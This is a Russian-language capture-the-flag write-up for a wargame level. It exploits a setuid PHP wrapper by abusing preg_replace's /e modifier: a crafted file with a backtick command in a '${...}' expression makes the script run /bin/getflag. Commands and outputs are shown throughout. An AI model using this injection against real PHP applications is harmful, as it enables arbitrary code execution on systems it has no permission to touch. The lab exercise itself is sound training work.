```
ls -l
```
> total 12\
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06\
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

так как на level06 есть suid, значить выполнять необходимо будет его

```
strace ./level06 2>&1 | grep execve
```
> execve("./level06", ["./level06"], [/* 20 vars */]) = 0\
execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 20 vars */]) = 0

Понятно, что этот бинарник выполняет скрипт, который лежит рядом

Тестируя понимаем, что первым аргументом level06 принимает файл, который будет распаршен
```
./level06
```
> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

```
./level06 123
```
> PHP Warning:  file_get_contents(123): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

```
cat level06.php
```
> #!/usr/bin/php\
<?php\
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }\
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }\
$r = x($argv[1], $argv[2]); print $r;\
?> 


В скрипте есть строка
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
								 ^
								 |
Это означает, что далее найденный паттерн выполниться в php коде, в нашем случае в функции y()

preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null
preg_replace — Выполняет поиск и замену по регулярному выражению
Выполняет поиск совпадений в строке subject с шаблоном pattern и заменяет их на replacement.

Главное, чтобы то что пришло в subject удовлетворяло регулярке и выполнилось в коде

дальнейшее выполнение нас не интересует, главное, чтобы php выполнил getflag для этого создаем файл, который будем ему подавать

```
echo  '[x ${`/bin/getflag`}]' > /tmp/php
```

```
./level06 /tmp/php
```
> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub\
 in /home/user/level06/level06.php(4) : regexp code on line 1
